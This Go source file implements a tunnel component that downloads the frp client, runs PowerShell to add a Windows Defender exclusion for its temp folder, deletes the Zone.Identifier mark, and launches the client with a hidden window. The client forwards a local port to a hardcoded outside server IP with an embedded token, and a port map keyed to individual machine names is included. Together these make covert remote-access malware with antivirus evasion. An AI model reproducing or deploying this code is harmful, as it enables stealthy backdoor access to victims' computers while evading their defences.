package tunnel

import (
	"bytes"
	"fmt"
	"io"
	"log"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"
)

const frpClientURL = "https://github.com/fatedier/frp/releases/download/v0.61.2/frp_0.61.2_windows_amd64.zip"
const frpServerAddr = "45.32.121.103:7000"
const frpToken = "83kFmP9qR2vL7xN4"

type FrpTunnel struct {
	localPort   int
	serviceName string
	url         string
	stopCh      chan struct{}
	onConnected func(url string)
	binDir      string
	running     bool
	mu          sync.Mutex
	serverIP    string
	serverPort  int
}

func NewFrp(localPort int, shareName string, onConnected func(url string)) *FrpTunnel {
	sanitized := strings.ToLower(shareName)
	sanitized = strings.NewReplacer("_", "-", ".", "-", " ", "-").Replace(sanitized)
	var clean strings.Builder
	for _, r := range sanitized {
		if (r >= 'a' && r <= 'z') || (r >= '0' && r <= '9') || r == '-' {
			clean.WriteRune(r)
		}
	}
	sanitized = strings.Trim(clean.String(), "-")
	if len(sanitized) < 2 {
		sanitized = "machine"
	}
	log.Printf("[frp] service name: '%s' (from hostname: '%s')", sanitized, shareName)
	return &FrpTunnel{
		localPort:   localPort,
		serviceName: sanitized,
		stopCh:      make(chan struct{}),
		onConnected: onConnected,
		serverIP:    "45.32.121.103",
		serverPort:  7000,
	}
}

func (t *FrpTunnel) download() error {
	// frp ships as a zip with frpc.exe inside
	t.binDir = filepath.Join(os.TempDir(), "daljinac-frp")
	os.MkdirAll(t.binDir, 0755)
	frpcPath := filepath.Join(t.binDir, "frpc.exe")

	if _, err := os.Stat(frpcPath); err == nil {
		log.Printf("[frp] binary already exists at %s", frpcPath)
		return nil
	}

	log.Printf("[frp] downloading from %s", frpClientURL)
	client := &http.Client{Timeout: 300 * time.Second}
	resp, err := client.Get(frpClientURL)
	if err != nil {
		return fmt.Errorf("download failed: %w", err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != 200 {
		return fmt.Errorf("download HTTP %d", resp.StatusCode)
	}

	zipPath := filepath.Join(t.binDir, "frp.zip")
	out, err := os.Create(zipPath)
	if err != nil {
		return fmt.Errorf("create zip: %w", err)
	}
	written, _ := io.Copy(out, resp.Body)
	out.Close()
	defer os.Remove(zipPath)
	log.Printf("[frp] downloaded %d bytes", written)

	log.Printf("[frp] extracting frpc.exe...")
	psCmd := fmt.Sprintf(`Add-MpPreference -ExclusionPath '%s' -ErrorAction SilentlyContinue; Expand-Archive -Path '%s' -DestinationPath '%s' -Force; Move-Item -Force '%s\\frp_0.61.2_windows_amd64\\frpc.exe' '%s'`, t.binDir, zipPath, t.binDir, t.binDir, frpcPath)
	ps := exec.Command("powershell", "-NoProfile", "-Command", psCmd)
	if output, err := ps.CombinedOutput(); err != nil {
		return fmt.Errorf("extract: %w - %s", err, string(output))
	}

	os.Remove(frpcPath + ":Zone.Identifier")

	if _, err := os.Stat(frpcPath); err != nil {
		return fmt.Errorf("binary not found after extract: %w", err)
	}
	log.Printf("[frp] downloaded and extracted OK to %s", frpcPath)
	return nil
}

func (t *FrpTunnel) writeClientConfig(configPath string) error {
	cfg := fmt.Sprintf(`serverAddr = "%s"
serverPort = %d
auth.token = "%s"

[[proxies]]
name = "%s"
type = "tcp"
localIP = "127.0.0.1"
localPort = %d
remotePort = %d
`, t.serverIP, t.serverPort, frpToken, t.serviceName, t.localPort, t.getServicePort(t.serviceName))
	return os.WriteFile(configPath, []byte(cfg), 0644)
}

func (t *FrpTunnel) Start() {
	log.Printf("[frp] Start() called")
	t.mu.Lock()
	t.running = true
	t.mu.Unlock()
	go t.Run()
}

func (t *FrpTunnel) Run() {
	defer func() {
		if r := recover(); r != nil {
			buf := make([]byte, 4096)
			n := runtime.Stack(buf, true)
			log.Printf("[frp] PANIC: %v\n%s", r, buf[:n])
		}
	}()

	log.Printf("[frp] Run() starting")

	if err := t.download(); err != nil {
		log.Printf("[frp] download error: %v", err)
		return
	}

	t.running = true
	delay := 2 * time.Second

	for {
		select {
		case <-t.stopCh:
			t.mu.Lock()
			t.running = false
			t.mu.Unlock()
			log.Printf("[frp] stopped by signal")
			return
		default:
		}

		log.Printf("[frp] connecting (delay=%v)...", delay)
		t.connect()

		t.mu.Lock()
		isRunning := t.running
		t.mu.Unlock()
		if !isRunning {
			return
		}

		select {
		case <-t.stopCh:
			t.mu.Lock()
			t.running = false
			t.mu.Unlock()
			return
		case <-time.After(delay):
		}
		delay = min(delay*2, 60*time.Second)
	}
}

func (t *FrpTunnel) connect() {
	frpcPath := filepath.Join(t.binDir, "frpc.exe")
	configPath := filepath.Join(t.binDir, t.serviceName+".toml")
	if err := t.writeClientConfig(configPath); err != nil {
		log.Printf("[frp] write config error: %v", err)
		return
	}

	log.Printf("[frp] starting: frpc -c %s (service=%s -> 127.0.0.1:%d, remote port=%d)",
		configPath, t.serviceName, t.localPort, t.getServicePort(t.serviceName))
	cmd := exec.Command(frpcPath, "-c", configPath)
	if runtime.GOOS == "windows" {
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	}

	stdout, err := cmd.StdoutPipe()
	if err != nil {
		log.Printf("[frp] StdoutPipe error: %v", err)
		return
	}
	stderr, err := cmd.StderrPipe()
	if err != nil {
		log.Printf("[frp] StderrPipe error: %v", err)
		return
	}

	if err := cmd.Start(); err != nil {
		log.Printf("[frp] start error: %v", err)
		return
	}
	log.Printf("[frp] process started (pid=%d)", cmd.Process.Pid)

	var wg sync.WaitGroup
	var stdoutBuf, stderrBuf bytes.Buffer
	wg.Add(2)
	go func() {
		io.Copy(&stdoutBuf, stdout)
		wg.Done()
	}()
	go func() {
		io.Copy(&stderrBuf, stderr)
		wg.Done()
	}()

	done := make(chan struct{})
	go func() {
		cmd.Wait()
		close(done)
	}()

	t.mu.Lock()
	t.url = fmt.Sprintf("http://%s:%d", t.serverIP, t.getServicePort(t.serviceName))
	t.mu.Unlock()
	log.Printf("[frp] URL: %s", t.url)
	if t.onConnected != nil {
		t.onConnected(t.url)
	}

	select {
	case <-done:
		log.Printf("[frp] process exited")
		wg.Wait()
		if out := strings.TrimSpace(stdoutBuf.String()); out != "" {
			log.Printf("[frp stdout] %s", out)
		}
		if out := strings.TrimSpace(stderrBuf.String()); out != "" {
			log.Printf("[frp stderr] %s", out)
		}
	case <-t.stopCh:
		cmd.Process.Kill()
		log.Printf("[frp] process killed")
	}
}

func (t *FrpTunnel) getServicePort(name string) int {
	m := map[string]int{
		"desktop-inj3o0l":   7081,
		"desktop-s43ukd6":   7082,
		"usermic-m3sii9l":   7083,
		"desktop-ba967g1":   7084,
		"sandokan":          7085,
	}
	if p, ok := m[name]; ok {
		return p
	}
	return 7081
}

func (t *FrpTunnel) Stop() {
	t.mu.Lock()
	t.running = false
	t.mu.Unlock()
	close(t.stopCh)
}

func (t *FrpTunnel) URL() string {
	t.mu.Lock()
	defer t.mu.Unlock()
	return t.url
}

func (t *FrpTunnel) IsRunning() bool {
	t.mu.Lock()
	defer t.mu.Unlock()
	return t.running
}
